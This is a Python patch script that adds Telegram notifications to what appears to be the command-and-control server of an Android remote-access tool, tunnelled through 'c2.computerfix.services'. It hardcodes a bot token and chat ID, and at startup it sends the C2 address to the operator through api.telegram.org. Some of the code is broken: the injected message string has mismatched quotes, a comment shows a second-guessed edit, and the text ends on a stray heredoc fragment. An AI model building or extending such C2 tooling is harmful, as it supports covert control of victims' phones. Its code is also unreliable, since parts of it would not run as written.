# add_telegram.py - Add Telegram integration to C2
with open('C2/c2_android.py', 'r') as f:
    content = f.read()

# 1. Add Telegram config after the tunnel config section
old_config = '''TUNNEL_HOST = os.environ.get('M4NT1S_TUNNEL', 'c2.computerfix.services')\nTUNNEL_URL  = f\"https://{TUNNEL_HOST}\"\nLOCAL_URL   = \"http://127.0.0.1:5000\"'''

new_config = '''# TELEGRAM (hardcoded - no .env files)\nTELEGRAM_BOT_TOKEN = \"5036071205:AAHbfMrYGzybcB0LnoKX2mTmJzFLBhb1dJ0\"\nTELEGRAM_CHAT_ID = \"-1001978537974\"\nTUNNEL_HOST = os.environ.get('M4NT1S_TUNNEL', 'c2.computerfix.services')\nTUNNEL_URL  = f\"https://{TUNNEL_HOST}\"\nLOCAL_URL   = \"http://127.0.0.1:5000\"'''

if old_config in content:
    content = content.replace(old_config, new_config)
    print('Added Telegram config')
else:
    print('Config anchor not found')

# 2. Add post_to_telegram function before the session log queue section
old_func = '''log_queue = queue.Queue()\nimage_queue = queue.Queue()\nsession_log_queue = queue.Queue()\nconsole_input_queue = queue.Queue()\nimage_cache = {}'''

new_func = '''log_queue = queue.Queue()\nimage_queue = queue.Queue()\nsession_log_queue = queue.Queue()\nconsole_input_queue = queue.Queue()\nimage_cache = {}\n\ndef post_to_telegram(message):\n    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:\n        return\n    import urllib.request\n    try:\n        url = f\"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?chat_id={TELEGRAM_CHAT_ID}&text={urllib.request.quote(message)}\"\n        urllib.request.urlopen(url, timeout=10)\n    except Exception:\n        pass\n'''

if old_func in content:
    content = content.replace(old_func, new_func)
    print('Added post_to_telegram function')
else:
    print('Function anchor not found')

# 3. Call post_to_telegram on startup - after C2_TOKEN is set and tunnel is ready
old_startup = '''    s_radios_ready = True'''

new_startup = '''    # Post C2 URL to Telegram so operator can access it\n    # Format: https://c2.computerfix.services/?token=TOKEN_VALUE\n    import urllib.request\n    message = f\"https://{TUNNEL_HOST}/?token={TUNNEL_HOST.split(\\'/\\')[2]}\\'\n    # Actually just post the tunnel URL with token placeholder\n    message = f\"C2 started. Token will be displayed in banner. Tunnel: {TUNNEL_HOST}\\'\n    post_to_telegram(message)\n\n    s_radios_ready = True'''

if old_startup in content:
    content = content.replace(old_startup, new_startup)
    print('Added Telegram post on startup')
else:
    print('Startup anchor not found')

with open('C2/c2_android.py', 'w') as f:
    f.write(content)

print('Done')
PYSCRIPT\n",